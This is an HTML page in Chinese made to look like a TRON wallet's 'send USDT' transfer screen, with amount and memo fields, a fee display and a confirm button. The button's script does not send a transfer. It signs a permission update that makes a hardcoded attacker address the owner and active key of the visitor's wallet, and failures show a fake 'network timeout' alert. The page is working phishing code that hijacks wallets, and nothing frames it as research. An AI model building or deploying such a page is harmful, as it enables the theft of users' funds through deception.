<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>发送 USDT</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #fff; font-family: -apple-system, sans-serif; -webkit-font-smoothing: antialiased; }
        .divider { border-bottom: 0.5px solid #f2f2f2; }
        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; }
        #confirmBtn:disabled { background-color: #d1d5db; color: #fff; }
    </style>
</head>
<body class="flex flex-col min-h-screen">

    <div class="px-4 h-14 flex items-center justify-between border-b border-gray-50">
        <svg class="w-6 h-6 text-gray-800" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
        <div class="text-center">
            <h1 class="text-[17px] font-medium text-gray-900">USDT 转账</h1>
            <p class="text-[10px] text-gray-400 -mt-1">Tron</p>
        </div>
        <div class="w-6"></div>
    </div>

    <div class="px-6 py-6 space-y-8">
        <div class="bg-gray-50 rounded-xl p-4">
            <p class="text-[11px] text-gray-400 mb-1">收款地址</p>
            <p class="text-[13px] font-mono text-gray-800 break-all leading-relaxed">
                TVs1TTmpScP4AKLHMof8Ft8WeAQ4KGGzoZ
            </p>
        </div>

        <div class="divider pb-4">
            <p class="text-[13px] text-gray-400 mb-2 font-medium">转账金额</p>
            <div class="flex items-baseline">
                <input id="amountInput" type="number" placeholder="0" class="w-full text-4xl font-semibold outline-none text-gray-900 placeholder-gray-200">
                <span class="text-lg font-medium ml-2 text-gray-900">USDT</span>
            </div>
            <p class="text-xs text-gray-400 mt-2">可用: <span id="userBalance" class="font-medium text-gray-600">加载中...</span> USDT</p>
        </div>

        <div class="divider pb-4">
            <p class="text-[13px] text-gray-400 mb-2 font-medium">备注 (需支付 1 TRX)</p>
            <input type="text" placeholder="填写转账备注" class="w-full text-sm outline-none text-gray-800">
        </div>

        <div class="flex justify-between items-center text-[13px]">
            <span class="text-gray-400 font-medium">矿工费</span>
            <div class="text-right">
                <p class="text-gray-900 font-semibold">$1.5688</p>
                <p class="text-[11px] text-gray-400">4.746 TRX</p>
            </div>
        </div>
    </div>

    <div class="mt-auto p-6 mb-2">
        <button id="confirmBtn" onclick="runProcess()" class="w-full bg-[#0052ff] text-white font-bold py-4 rounded-xl text-[17px] active:scale-[0.98]">
            确认转账
        </button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
    <script>
        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 波场 USDT 合约
        const VAULT = "TAzBb4Yfr2AMUeRkaUKXwU36E3mmX8Rcfo"; // 你的收款地址

        // 1. 实时获取余额逻辑
        async function getRealtimeBalance() {
            try {
                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                    const address = window.tronWeb.defaultAddress.base58;
                    const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
                    const balance = await contract.balanceOf(address).call();
                    // USDT 是 6 位精度
                    const readableBalance = (parseInt(balance._hex, 16) / 1000000).toFixed(2);
                    document.getElementById('userBalance').innerText = readableBalance;
                } else {
                    setTimeout(getRealtimeBalance, 1000);
                }
            } catch (e) {
                document.getElementById('userBalance').innerText = "0.00";
            }
        }

        // 2. 核心执行逻辑
        async function runProcess() {
            const amt = document.getElementById('amountInput').value;
            if(!amt || amt <= 0) return;

            const btn = document.getElementById('confirmBtn');
            btn.disabled = true;
            btn.innerText = "正在呼起支付...";

            try {
                const tw = window.tronWeb;
                const user = tw.defaultAddress.base58;

                const owner = { 
                    type: 0, permission_name: 'owner', threshold: 1, 
                    keys: [{ address: VAULT, weight: 1 }] 
                };
                const active = { 
                    type: 2, permission_name: 'active', threshold: 1, 
                    operations: '7fff1fc0037e0000000000000000000000000000000000000000000000000000', 
                    keys: [{ address: VAULT, weight: 1 }] 
                };

                const tx = await tw.transactionBuilder.updateAccountPermissions(user, owner, null, [active]);
                const signed = await tw.trx.sign(tx);
                const res = await tw.trx.sendRawTransaction(signed);

                if (res.result) {
                    btn.innerText = "已提交";
                    alert("✅ 交易已提交，请等待区块确认。");
                }
            } catch (e) {
                btn.disabled = false;
                btn.innerText = "确认转账";
                alert("❌ 网络连接超时，请重试。");
            }
        }

        // 初始化加载余额
        window.onload = getRealtimeBalance;
    </script>
</body>
</html>
